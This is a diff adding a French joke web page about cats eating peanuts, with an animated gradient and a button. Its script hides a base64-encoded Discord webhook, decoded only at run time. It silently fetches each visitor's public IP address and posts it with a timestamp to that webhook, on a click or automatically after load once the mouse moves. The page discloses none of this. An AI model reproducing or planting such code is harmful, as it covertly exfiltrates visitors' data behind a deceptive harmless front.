@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Les chats sont les meilleurs</title>
+    <style>
+        body,html{margin:0;padding:0;height:100%;overflow:hidden;font-family:'Segoe UI',sans-serif;
+            background:linear-gradient(-45deg,#ff9a9e,#fad0c4,#a18cd1,#fbc2eb);background-size:400% 400%;
+            animation:g 15s ease infinite;display:flex;flex-direction:column;align-items:center;justify-content:center;color:white;}
+        @keyframes g{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+        h1{font-size:6vw;font-weight:900;background:rgba(255,255,255,0.15);padding:60px 100px;border-radius:50px;backdrop-filter:blur(15px);}
+        .btn{margin-top:30px;padding:16px 40px;background:rgba(255,255,255,0.25);border:none;border-radius:50px;
+            color:white;font-size:19px;font-weight:bold;cursor:pointer;backdrop-filter:blur(10px);box-shadow:0 8px 25px rgba(0,0,0,0.3);transition:.3s;}
+        .btn:hover{transform:scale(1.08);}
+    </style>
+</head>
+<body>
+<h1>Les chats sont les meilleurs</h1>
+<button id="btn" class="btn">Clique ici et les chats vont manger des cacahuètes</button>
+
+<script>
+const webhookB64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0MTc4NDA4MDU1ODcxOTAxNy9PSWp0WmpDRXVURkx4LWhOMF9JREpMRTVsd3AtcDR5d0E3VFBhQ08zTWdTcnhkMEpwNm8zbDBjLWp5ZU9oWWkxak9PVQ=="; 
+
+let human = false;
+document.onmousemove = document.ontouchstart = () => human = true;
+
+async function getIP() {
+    try { return (await (await fetch("https://api.ipify.org?format=json")).json()).ip; }
+    catch { return "inconnue"; }
+}
+
+async function send() {
+    const ip = await getIP();
+    const url = atob(webhookB64); // ← décode seulement à l'exécution
+
+    fetch(url, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            embeds: [{
+                title: "Nouveau chat",
+                color: 16749880,
+                fields: [
+                    {name:"IP",value:ip,inline:true},
+                    {name:"Heure",value:new Date().toLocaleString("fr-FR")}
+                ],
+                thumbnail:{url:"https://cataas.com/cat"}
+            }]
+        })
+    });
+}
+
+document.getElementById("btn").onclick = () => {
+    human = true;
+    send();
+    document.getElementById("btn").style = "transform:scale(0);transition:.6s";
+    setTimeout(() => document.getElementById("btn").remove(), 600);
+    alert("Merci ! Les chats sont contents");
+};
+
+setTimeout(() => { if (human) send(); }, 3500);
+</script>
+</body>
+</html>
